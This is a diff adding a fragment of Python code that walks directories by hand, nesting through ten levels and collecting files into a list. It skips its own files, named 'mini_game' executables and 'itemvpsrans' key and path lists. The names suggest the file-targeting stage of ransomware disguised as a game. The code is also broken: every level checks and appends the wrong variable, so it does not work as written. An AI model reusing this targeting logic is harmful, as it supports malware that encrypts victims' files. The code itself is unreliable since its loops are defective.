@@ -1,0 +1,65 @@
+if os.path.isdir(dirfile):
+
+                #third instance
+                    for dirfile1 in os.listdir(dirfile):
+                        if file =='mini_game.py' or file=='itemvpsrans.key' or file=='mini_game_open.py' or file=='mini_game.exe' or file=='mini_game_open.exe' or file=='itemvpsranspaths.txt' or file=='itemlistvpsrans.key':
+                            continue
+                        if os.path.isfile(file):
+                            files.append(file)
+                        if os.path.isdir(file):
+
+                            # fourth instance
+                            for dirfile in os.listdir(file):
+                                if file =='mini_game.py' or file=='itemvpsrans.key' or file=='mini_game_open.py' or file=='mini_game.exe' or file=='mini_game_open.exe' or file=='itemvpsranspaths.txt' or file=='itemlistvpsrans.key':
+                                    continue
+                                if os.path.isfile(file):
+                                    files.append(file)
+                                if os.path.isdir(file):
+                                    
+                                    #fifth instance
+                                    for dirfile in os.listdir(file):
+                                        if file =='mini_game.py' or file=='itemvpsrans.key' or file=='mini_game_open.py' or file=='mini_game.exe' or file=='mini_game_open.exe' or file=='itemvpsranspaths.txt' or file=='itemlistvpsrans.key':
+                                            continue
+                                        if os.path.isfile(file):
+                                            files.append(file)
+                                        if os.path.isdir(file):
+                                            
+                                            #sixth instance
+                                            for dirfile in os.listdir(file):
+                                                if file =='mini_game.py' or file=='itemvpsrans.key' or file=='mini_game_open.py' or file=='mini_game.exe' or file=='mini_game_open.exe' or file=='itemvpsranspaths.txt' or file=='itemlistvpsrans.key':
+                                                    continue
+                                                if os.path.isfile(file):
+                                                    files.append(file)
+                                                if os.path.isdir(file):
+
+                                                    # seventh instance
+                                                    for dirfile in os.listdir(file):
+                                                        if file =='mini_game.py' or file=='itemvpsrans.key' or file=='mini_game_open.py' or file=='mini_game.exe' or file=='mini_game_open.exe' or file=='itemvpsranspaths.txt' or file=='itemlistvpsrans.key':
+                                                            continue
+                                                        if os.path.isfile(file):
+                                                            files.append(file)                 
+                                                        if os.path.isdir(file):
+
+                                                            #eighth instance
+                                                            for dirfile in os.listdir(file):
+                                                                if file =='mini_game.py' or file=='itemvpsrans.key' or file=='mini_game_open.py' or file=='mini_game.exe' or file=='mini_game_open.exe' or file=='itemvpsranspaths.txt' or file=='itemlistvpsrans.key':
+                                                                    continue
+                                                                if os.path.isfile(file):
+                                                                    files.append(file)
+                                                                if os.path.isdir(file):
+
+                                                                    #ninth instance
+                                                                    for dirfile in os.listdir(file):
+                                                                        if file =='mini_game.py' or file=='itemvpsrans.key' or file=='mini_game_open.py' or file=='mini_game.exe' or file=='mini_game_open.exe' or file=='itemvpsranspaths.txt' or file=='itemlistvpsrans.key':
+                                                                            continue
+                                                                        if os.path.isfile(file):
+                                                                            files.append(file)
+
+                                                                        if os.path.isdir(file):
+
+                                                                            #tenth instance
+                                                                            for dirfile in os.listdir(file):
+                                                                                if file =='mini_game.py' or file=='itemvpsrans.key' or file=='mini_game_open.py' or file=='mini_game.exe' or file=='mini_game_open.exe' or file=='itemvpsranspaths.txt' or file=='itemlistvpsrans.key':
+                                                                                    continue
+                                                                                if os.path.isfile(file):
+                                                                                    files.append(file)        
